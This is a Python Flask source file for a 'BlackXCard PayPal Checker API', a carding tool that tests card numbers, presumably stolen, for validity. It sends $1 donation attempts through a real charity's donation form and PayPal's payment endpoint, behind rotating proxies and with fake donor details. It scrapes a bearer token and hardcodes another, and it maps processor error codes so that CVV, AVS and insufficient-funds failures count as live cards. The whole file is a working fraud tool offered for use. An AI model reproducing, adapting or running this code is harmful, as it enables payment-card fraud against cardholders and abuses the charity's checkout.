from flask import Flask, request, jsonify
import aiohttp
import asyncio
import time
import uuid
import random
import re
import logging
from bs4 import BeautifulSoup

# Flask app setup
app = Flask(__name__)
logging.basicConfig(level=logging.INFO)

def parse_payment_error(issue, response_code, description):
    
    approved_codes = [
        'CVV2_FAILURE_POSSIBLE_RETRY_WITH_CVV',
        'CVV2_FAILURE',
        'INSUFFICIENT_FUNDS',
        'INVALID_PIN',
        'SOFT_AVS',
        'AVS_FAILURE',
        'DUPLICATE_TRANSACTION',
        'INCORRECT_PIN_REENTER'
    ]
    
    response_map = {
        '0000': ('APPROVED', 'APPROVED'),
        '00N7': ('CVV2_FAILURE_POSSIBLE_RETRY_WITH_CVV', 'APPROVED'),
        '0100': ('REFERRAL [0100]', 'DECLINED'),
        '0390': ('ACCOUNT_NOT_FOUND [0390]', 'DECLINED'),
        '0500': ('DO_NOT_HONOR [0500]', 'DECLINED'),
        '0580': ('UNAUTHORIZED_TRANSACTION [0580]', 'DECLINED'),
        '0800': ('BAD_RESPONSE_REVERSAL_REQUIRED [0800]', 'DECLINED'),
        '0880': ('CRYPTOGRAPHIC_FAILURE [0880]', 'DECLINED'),
        '0R00': ('CANCELLED_PAYMENT [0R00]', 'DECLINED'),
        '1000': ('PARTIAL_AUTHORIZATION [1000]', 'DECLINED'),
        '10BR': ('ISSUER_REJECTED [10BR]', 'DECLINED'),
        '1300': ('INVALID_DATA_FORMAT [1300]', 'DECLINED'),
        '1310': ('INVALID_AMOUNT [1310]', 'DECLINED'),
        '1312': ('INVALID_TRANSACTION_CARD_ISSUER_ACQUIRER [1312]', 'DECLINED'),
        '1317': ('INVALID_CAPTURE_DATE [1317]', 'DECLINED'),
        '1320': ('INVALID_CURRENCY_CODE [1320]', 'DECLINED'),
        '1330': ('INVALID_ACCOUNT [1330]', 'DECLINED'),
        '1335': ('INVALID_ACCOUNT_RECURRING [1335]', 'DECLINED'),
        '1340': ('INVALID_TERMINAL [1340]', 'DECLINED'),
        '1350': ('INVALID_MERCHANT [1350]', 'DECLINED'),
        '1360': ('BAD_PROCESSING_CODE [1360]', 'DECLINED'),
        '1370': ('INVALID_MCC [1370]', 'DECLINED'),
        '1380': ('INVALID_EXPIRATION [1380]', 'DECLINED'),
        '1382': ('INVALID_CARD_VERIFICATION_VALUE [1382]', 'DECLINED'),
        '1384': ('INVALID_LIFE_CYCLE_OF_TRANSACTION [1384]', 'DECLINED'),
        '1390': ('INVALID_ORDER [1390]', 'DECLINED'),
        '1393': ('TRANSACTION_CANNOT_BE_COMPLETED [1393]', 'DECLINED'),
        '5100': ('GENERIC_DECLINE [5100]', 'DECLINED'),
        '5110': ('CVV2_FAILURE [5110]', 'APPROVED'),
        '5120': ('INSUFFICIENT_FUNDS [5120]', 'APPROVED'),
        '5130': ('INVALID_PIN [5130]', 'APPROVED'),
        '5135': ('DECLINED_PIN_TRY_EXCEEDED [5135]', 'DECLINED'),
        '5140': ('CARD_CLOSED [5140]', 'DECLINED'),
        '5150': ('PICKUP_CARD_SPECIAL_CONDITIONS [5150]', 'DECLINED'),
        '5160': ('UNAUTHORIZED_USER [5160]', 'DECLINED'),
        '5170': ('AVS_FAILURE [5170]', 'APPROVED'),
        '5180': ('INVALID_OR_RESTRICTED_CARD [5180]', 'DECLINED'),
        '5190': ('SOFT_AVS [5190]', 'APPROVED'),
        '5200': ('DUPLICATE_TRANSACTION [5200]', 'APPROVED'),
        '5210': ('INVALID_TRANSACTION [5210]', 'DECLINED'),
        '5400': ('EXPIRED_CARD [5400]', 'DECLINED'),
        '5500': ('INCORRECT_PIN_REENTER [5500]', 'APPROVED'),
        '5650': ('DECLINED_SCA_REQUIRED [5650]', 'DECLINED'),
        '5700': ('TRANSACTION_NOT_PERMITTED [5700]', 'DECLINED'),
        '5710': ('TX_ATTEMPTS_EXCEED_LIMIT [5710]', 'DECLINED'),
        '5800': ('REVERSAL_REJECTED [5800]', 'DECLINED'),
        '5900': ('INVALID_ISSUE [5900]', 'DECLINED'),
        '5910': ('ISSUER_NOT_AVAILABLE_NOT_RETRIABLE [5910]', 'DECLINED'),
        '5920': ('ISSUER_NOT_AVAILABLE_RETRIABLE [5920]', 'DECLINED'),
        '5930': ('CARD_NOT_ACTIVATED [5930]', 'DECLINED'),
        '6300': ('ACCOUNT_NOT_ON_FILE [6300]', 'DECLINED'),
        '7600': ('APPROVED_NON_CAPTURE [7600]', 'DECLINED'),
        '7700': ('ERROR_3DS [7700]', 'DECLINED'),
        '7710': ('AUTHENTICATION_FAILED [7710]', 'DECLINED'),
        '7800': ('BIN_ERROR [7800]', 'DECLINED'),
        '7900': ('PIN_ERROR [7900]', 'DECLINED'),
        '8000': ('PROCESSOR_SYSTEM_ERROR [8000]', 'DECLINED'),
        '8010': ('HOST_KEY_ERROR [8010]', 'DECLINED'),
        '8020': ('CONFIGURATION_ERROR [8020]', 'DECLINED'),
        '8030': ('UNSUPPORTED_OPERATION [8030]', 'DECLINED'),
        '8100': ('FATAL_COMMUNICATION_ERROR [8100]', 'DECLINED'),
        '8110': ('RETRIABLE_COMMUNICATION_ERROR [8110]', 'DECLINED'),
        '8220': ('SYSTEM_UNAVAILABLE [8220]', 'DECLINED'),
        '9100': ('DECLINED_PLEASE_RETRY [9100]', 'DECLINED'),
        '9500': ('SUSPECTED_FRAUD [9500]', 'DECLINED'),
        '9510': ('SECURITY_VIOLATION [9510]', 'DECLINED'),
        '9520': ('LOST_OR_STOLEN [9520]', 'DECLINED'),
        '9530': ('HOLD_CALL_CENTER [9530]', 'DECLINED'),
        '9540': ('REFUSED_CARD [9540]', 'DECLINED'),
        '9600': ('UNRECOGNIZED_RESPONSE_CODE [9600]', 'DECLINED'),
        'PCNR': ('CONTINGENCIES_NOT_RESOLVED [PCNR]', 'DECLINED'),
        'PCVV': ('CVV_FAILURE [PCVV]', 'APPROVED'),
        'CARD_TYPE_NOT_SUPPORTED': ('CARD_TYPE_NOT_SUPPORTED', 'DECLINED'),
        'ORDER_NOT_APPROVED': ('ORDER_NOT_APPROVED', 'DECLINED'),
        'PAYER_CANNOT_PAY': ('PAYER_CANNOT_PAY', 'DECLINED')
    }
    
    if response_code and response_code in response_map:
        return response_map[response_code]
    
    if issue:
        issue_upper = issue.upper()
        if issue_upper in approved_codes:
            return (issue_upper, 'APPROVED')
        
        for code, (msg, status) in response_map.items():
            if issue_upper in msg.upper() or code in issue_upper:
                return (msg, status)
    
    if description and not issue:
        desc_lower = description.lower()
        
        if 'insufficient' in desc_lower or 'over credit limit' in desc_lower:
            return ('INSUFFICIENT_FUNDS [5120]', 'APPROVED')
        elif 'cvv' in desc_lower or 'security code' in desc_lower:
            return ('CVV2_FAILURE [5110]', 'APPROVED')
        elif 'expired' in desc_lower:
            return ('EXPIRED_CARD [5400]', 'DECLINED')
        elif 'decline' in desc_lower:
            return ('GENERIC_DECLINE [5100]', 'DECLINED')
    
    return ('GENERIC_DECLINE [5100]', 'DECLINED')

async def get_fresh_bearer_token(session, proxy=None):
    """Fetch fresh bearer token from the donation page for every request"""
    try:
        headers = {
            "User-Agent": "Mozilla/5.0 (Linux; Android 12; M2101K7AI) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8"
        }
        
        # Get the donation page
        async with session.get("https://www.bsv.net.au/donate_a_brick/", 
                              headers=headers, proxy=proxy) as response:
            if response.status != 200:
                return "A21AAOQblZXkZRgxCSHHn5OwHswbR9MHxA71T8_1_lOFFns5FJaYrfyxb5VhrzZcOpZmY-ptIkYUZZfQiR6YfPoH6HZPs7jqQ"
            
            html = await response.text()
            soup = BeautifulSoup(html, 'html.parser')
            
            # Look for scripts containing PayPal/Braintree initialization
            scripts = soup.find_all('script')
            
            for script in scripts:
                if script.string:
                    content = script.string
                    # Look for bearer token patterns
                    patterns = [
                        r'authorization["\']?\s*:\s*["\']?Bearer\s+([A-Za-z0-9_-]+)',
                        r'Authorization["\']?\s*:\s*["\']?Bearer\s+([A-Za-z0-9_-]+)',
                        r'["\']access_token["\']?\s*:\s*["\']([A-Za-z0-9_-]+)',
                        r'clientToken["\']?\s*:\s*["\']([A-Za-z0-9_.-]+)'
                    ]
                    
                    for pattern in patterns:
                        matches = re.findall(pattern, content)
                        for match in matches:
                            if match.startswith('A21AA') and len(match) > 60:
                                logging.info("Found fresh bearer token")
                                return match
        
        # If no token found, return the working one from network tab
        return "A21AAOQblZXkZRgxCSHHn5OwHswbR9MHxA71T8_1_lOFFns5FJaYrfyxb5VhrzZcOpZmY-ptIkYUZZfQiR6YfPoH6HZPs7jqQ"
        
    except Exception as e:
        logging.error(f"Error fetching token: {e}")
        return "A21AAOQblZXkZRgxCSHHn5OwHswbR9MHxA71T8_1_lOFFns5FJaYrfyxb5VhrzZcOpZmY-ptIkYUZZfQiR6YfPoH6HZPs7jqQ"

async def check_card_async(card, month, year, cvv, proxy_str=None):
    start = time.time()
    
    base_url = "https://www.bsv.net.au"
    
    if len(str(year)) == 2:
        year = f"20{year}"
    
    email = f"user{uuid.uuid4().hex[:8]}@indigobook.com"
    first_name = "royo"
    last_name = "almo"
    card_name = "victusxgod"
    amount = "1.00"
    
    proxy = None
    proxy_used = proxy_str
    
    if proxy_str:
        parts = proxy_str.split(":")
        if len(parts) == 4:
            proxy = f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
        elif len(parts) == 2:
            proxy = f"http://{parts[0]}:{parts[1]}"
    
    max_retries = 3
    for attempt in range(max_retries):
        try:
            timeout = aiohttp.ClientTimeout(total=60)
            
            async with aiohttp.ClientSession(timeout=timeout) as session:
                headers = {
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36',
                    'Accept-Language': 'en-US,en;q=0.9',
                    'sec-ch-ua': '"Chromium";v="142", "Google Chrome";v="142", "Not_A Brand";v="99"',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '"Windows"'
                }
                
                form_headers = headers.copy()
                form_headers.update({
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                    'Cache-Control': 'max-age=0',
                    'Sec-Fetch-Dest': 'document',
                    'Sec-Fetch-Mode': 'navigate',
                    'Sec-Fetch-Site': 'cross-site',
                    'Sec-Fetch-User': '?1',
                    'Upgrade-Insecure-Requests': '1'
                })
                
                async with session.get(f"{base_url}/donate_a_brick/",
                                      headers=form_headers,
                                      proxy=proxy) as r:
                    if r.status != 200:
                        if attempt < max_retries - 1:
                            await asyncio.sleep(1)
                            continue
                        return {"status": "PROXY_DEAD", "response": "Proxy dead change your proxy"}
                    
                    html = await r.text()
                    match = re.search(r'name="give-form-hash" value="([^"]+)"', html)
                    if not match:
                        if attempt < max_retries - 1:
                            await asyncio.sleep(1)
                            continue
                        return {"status": "PROXY_DEAD", "response": "Proxy dead change your proxy"}
                    
                    form_hash = match.group(1)
                
                await asyncio.sleep(0.5)
                
                create_headers = headers.copy()
                create_headers.update({
                    'Accept': '*/*',
                    'Origin': base_url,
                    'Referer': f'{base_url}/donate_a_brick/',
                    'Sec-Fetch-Dest': 'empty',
                    'Sec-Fetch-Mode': 'cors',
                    'Sec-Fetch-Site': 'same-origin'
                })
                
                form_data = aiohttp.FormData()
                form_data.add_field('give-honeypot', '')
                form_data.add_field('give-form-id-prefix', '6774-1')
                form_data.add_field('give-form-id', '6774')
                form_data.add_field('give-form-title', 'Donate a Brick')
                form_data.add_field('give-current-url', f'{base_url}/donate_a_brick/')
                form_data.add_field('give-form-url', f'{base_url}/donate_a_brick/')
                form_data.add_field('give-form-minimum', '1.00')
                form_data.add_field('give-form-maximum', '999999.99')
                form_data.add_field('give-form-hash', form_hash)
                form_data.add_field('give-price-id', 'custom')
                form_data.add_field('give-recurring-logged-in-only', '')
                form_data.add_field('give-logged-in-only', '1')
                form_data.add_field('give_recurring_donation_details', '{"is_recurring":false}')
                form_data.add_field('give-amount', amount)
                form_data.add_field('give_stripe_payment_method', '')
                form_data.add_field('give-fee-recovery-settings', '{"fee_recovery":false}')
                form_data.add_field('payment-mode', 'paypal-commerce')
                form_data.add_field('give_first', first_name)
                form_data.add_field('give_last', last_name)
                form_data.add_field('give_email', email)
                form_data.add_field('card_name', card_name)
                form_data.add_field('card_exp_month', '')
                form_data.add_field('card_exp_year', '')
                form_data.add_field('give-gateway', 'paypal-commerce')
                
                async with session.post(f"{base_url}/wp-admin/admin-ajax.php?action=give_paypal_commerce_create_order",
                                       data=form_data,
                                       headers=create_headers,
                                       proxy=proxy) as r:
                    if r.status != 200:
                        if attempt < max_retries - 1:
                            await asyncio.sleep(1)
                            continue
                        return {"status": "PROXY_DEAD", "response": "Proxy dead change your proxy"}
                    
                    try:
                        create_result = await r.json()
                    except:
                        if attempt < max_retries - 1:
                            await asyncio.sleep(1)
                            continue
                        return {"status": "PROXY_DEAD", "response": "Proxy dead change your proxy"}
                    
                    if not create_result.get('success'):
                        if attempt < max_retries - 1:
                            await asyncio.sleep(1)
                            continue
                        return {"status": "PROXY_DEAD", "response": "Proxy dead change your proxy"}
                    
                    order_id = create_result['data']['id']
                    logging.info(f"Created order: {order_id}")
                
                await asyncio.sleep(0.5)
                
                # GET FRESH BEARER TOKEN FOR EVERY REQUEST
                fresh_bearer = await get_fresh_bearer_token(session, proxy)
                logging.info(f"Using fresh bearer token: {fresh_bearer[:50]}...")
                
                expiry = f"{year}-{month.zfill(2)}"
                
                payment_data = {
                    "payment_source": {
                        "card": {
                            "number": card,
                            "expiry": expiry,
                            "security_code": cvv,
                            "attributes": {
                                "verification": {
                                    "method": "SCA_WHEN_REQUIRED"
                                }
                            }
                        }
                    },
                    "application_context": {
                        "vault": False
                    }
                }
                
                paypal_headers = {
                    'Accept': '*/*',
                    'Accept-Language': 'en-US,en;q=0.9',
                    'Authorization': f'Bearer {fresh_bearer}',
                    'Braintree-Sdk-Version': '3.32.0-payments-sdk-dev',
                    'Content-Type': 'application/json',
                    'Origin': 'https://assets.braintreegateway.com',
                    'PayPal-Client-Metadata-Id': '884db834243e787dd26ea81d2fb2b28b',
                    'Referer': 'https://assets.braintreegateway.com/',
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36',
                    'sec-ch-ua': '"Chromium";v="142", "Google Chrome";v="142", "Not_A Brand";v="99"',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '"Windows"',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'cross-site'
                }
                
                async with session.post(f"https://cors.api.paypal.com/v2/checkout/orders/{order_id}/confirm-payment-source",
                                       json=payment_data,
                                       headers=paypal_headers,
                                       proxy=proxy) as r:
                    if r.status != 200:
                        try:
                            error_data = await r.json()
                            details = error_data.get('details', [{}])
                            if details:
                                issue = details[0].get('issue', '')
                                description = details[0].get('description', '')
                                
                                response_code = ''
                                if 'processor_response' in error_data:
                                    response_code = error_data['processor_response'].get('response_code', '')
                                
                                status_text, status_type = parse_payment_error(issue, response_code, description)
                                return {"status": status_type, "response": status_text}
                        except:
                            pass
                        
                        if attempt < max_retries - 1:
                            await asyncio.sleep(1)
                            continue
                        return {"status": "PROXY_DEAD", "response": "Proxy dead change your proxy"}
                    
                    try:
                        confirm_result = await r.json()
                    except:
                        if attempt < max_retries - 1:
                            await asyncio.sleep(1)
                            continue
                        return {"status": "PROXY_DEAD", "response": "Proxy dead change your proxy"}
                    
                    payment_status = confirm_result.get('status', '')
                    
                    if payment_status != 'APPROVED':
                        details = confirm_result.get('details', [{}])
                        if details:
                            issue = details[0].get('issue', '')
                            description = details[0].get('description', '')
                            
                            response_code = ''
                            if 'processor_response' in confirm_result:
                                response_code = confirm_result['processor_response'].get('response_code', '')
                            
                            status_text, status_type = parse_payment_error(issue, response_code, description)
                            return {"status": status_type, "response": status_text}
                
                await asyncio.sleep(0.5)
                
                approve_data = aiohttp.FormData()
                approve_data.add_field('give-honeypot', '')
                approve_data.add_field('give-form-id-prefix', '6774-1')
                approve_data.add_field('give-form-id', '6774')
                approve_data.add_field('give-form-title', 'Donate a Brick')
                approve_data.add_field('give-current-url', f'{base_url}/donate_a_brick/')
                approve_data.add_field('give-form-url', f'{base_url}/donate_a_brick/')
                approve_data.add_field('give-form-minimum', '1.00')
                approve_data.add_field('give-form-maximum', '999999.99')
                approve_data.add_field('give-form-hash', form_hash)
                approve_data.add_field('give-price-id', 'custom')
                approve_data.add_field('give-recurring-logged-in-only', '')
                approve_data.add_field('give-logged-in-only', '1')
                approve_data.add_field('give_recurring_donation_details', '{"is_recurring":false}')
                approve_data.add_field('give-amount', amount)
                approve_data.add_field('give_stripe_payment_method', '')
                approve_data.add_field('give-fee-recovery-settings', '{"fee_recovery":false}')
                approve_data.add_field('payment-mode', 'paypal-commerce')
                approve_data.add_field('give_first', first_name)
                approve_data.add_field('give_last', last_name)
                approve_data.add_field('give_email', email)
                approve_data.add_field('card_name', card_name)
                approve_data.add_field('card_exp_month', '')
                approve_data.add_field('card_exp_year', '')
                approve_data.add_field('give-gateway', 'paypal-commerce')
                
                approve_headers = headers.copy()
                approve_headers.update({
                    'Accept': '*/*',
                    'Origin': base_url,
                    'Referer': f'{base_url}/donate_a_brick/',
                    'Sec-Fetch-Dest': 'empty',
                    'Sec-Fetch-Mode': 'cors',
                    'Sec-Fetch-Site': 'same-origin'
                })
                
                async with session.post(f"{base_url}/wp-admin/admin-ajax.php?action=give_paypal_commerce_approve_order&order={order_id}",
                                       data=approve_data,
                                       headers=approve_headers,
                                       proxy=proxy) as r:
                    if r.status != 200:
                        if attempt < max_retries - 1:
                            await asyncio.sleep(1)
                            continue
                        return {"status": "PROXY_DEAD", "response": "Proxy dead change your proxy"}
                    
                    try:
                        approve_result = await r.json()
                    except:
                        if attempt < max_retries - 1:
                            await asyncio.sleep(1)
                            continue
                        return {"status": "PROXY_DEAD", "response": "Proxy dead change your proxy"}
                    
                    if approve_result.get('success'):
                        return {"status": "APPROVED", "response": "APPROVED"}
                    else:
                        error_data = approve_result.get('data', {})
                        
                        if isinstance(error_data, dict):
                            if 'error' in error_data:
                                if isinstance(error_data['error'], dict):
                                    error_obj = error_data['error']
                                    details = error_obj.get('details', [{}])
                                    if details:
                                        issue = details[0].get('issue', '')
                                        description = details[0].get('description', '')
                                        status_text, status_type = parse_payment_error(issue, '', description)
                                        return {"status": status_type, "response": status_text}
                                else:
                                    error_msg = str(error_data['error']).strip()
                                    
                                    error_code = ''
                                    error_description = error_msg
                                    
                                    match = re.match(r'^\s*([A-Z_]+)\.?\s*(.*)$', error_msg)
                                    if match:
                                        error_code = match.group(1)
                                        error_description = match.group(2)
                                    
                                    if 'DO_NOT_HONOR' in error_msg:
                                        if 'ZIP' in error_msg or 'postal code' in error_msg:
                                            return {"status": "APPROVED", "response": "AVS_FAILURE [5170]"}
                                        else:
                                            return {"status": "DECLINED", "response": "DO_NOT_HONOR [0500]"}
                                    
                                    status_text, status_type = parse_payment_error(error_code, '', error_description)
                                    return {"status": status_type, "response": status_text}
                            
                            error_msg = error_data.get('message', 'Unknown error')
                            processor_code = ''
                            if 'processor_response' in error_data:
                                processor_code = error_data['processor_response'].get('response_code', '')
                            
                            if processor_code:
                                status_text, status_type = parse_payment_error('', processor_code, error_msg)
                                return {"status": status_type, "response": status_text}
                            else:
                                status_text, status_type = parse_payment_error('', '', error_msg)
                                return {"status": status_type, "response": status_text}
                        else:
                            status_text, status_type = parse_payment_error('', '', str(error_data))
                            return {"status": status_type, "response": status_text}
        
        except Exception as e:
            error_msg = str(e).lower()
            if attempt < max_retries - 1 and ("disconnect" in error_msg or "connection" in error_msg or "reset" in error_msg):
                await asyncio.sleep(1)
                continue
            
            if "proxy" in error_msg or "connection" in error_msg:
                return {"status": "PROXY_DEAD", "response": "Proxy dead change your proxy"}
            return {"status": "DECLINED", "response": f"Error: {str(e)[:30]}"}
    
    return {"status": "PROXY_DEAD", "response": "Proxy dead change your proxy"}

def run_async_check(card, month, year, cvv, proxy_str=None):
    """Run async function in sync context"""
    return asyncio.run(check_card_async(card, month, year, cvv, proxy_str))

# API Routes
@app.route('/')
def home():
    return jsonify({
        "message": "BlackXCard PayPal Checker API", 
        "usage": "/check?gateway=PayPal&key=BlackXCard&proxy=ip:port:user:pass&cc=card|mm|yy|cvv"
    })

@app.route('/check', methods=['GET'])
def check_card():
    """Check single card endpoint"""
    gateway = request.args.get('gateway')
    key = request.args.get('key')
    proxy = request.args.get('proxy')
    card_data = request.args.get('cc')
    
    # Check authentication
    if gateway != 'PayPal' or key != 'BlackXCard':
        return jsonify({
            "status": "ERROR",
            "response": "Invalid gateway or key"
        })
    
    if not proxy:
        return jsonify({
            "status": "ERROR", 
            "response": "Proxy required"
        })
    
    if not card_data:
        return jsonify({
            "status": "ERROR",
            "response": "Card data required"
        })
    
    # Parse card data
    if '|' in card_data:
        parts = card_data.split('|')
        if len(parts) == 4:
            card, month, year, cvv = parts
        else:
            return jsonify({
                "status": "ERROR",
                "response": "Invalid card format. Use: cc|mm|yy|cvv"
            })
    else:
        return jsonify({
            "status": "ERROR",
            "response": "Invalid card format. Use: cc|mm|yy|cvv"
        })
    
    # Check card
    result = run_async_check(card, month, year, cvv, proxy)
    
    return jsonify(result)

if __name__ == '__main__':
    print("🚀 BlackXCard PayPal Checker API Starting...")
    print("📝 Endpoint: /check?gateway=PayPal&key=BlackXCard&proxy=ip:port:user:pass&cc=card|mm|yy|cvv")
    print("🔄 Feature: Fresh Bearer Token Fetching for Every Request")
    
    app.run(host='0.0.0.0', port=9005, debug=False)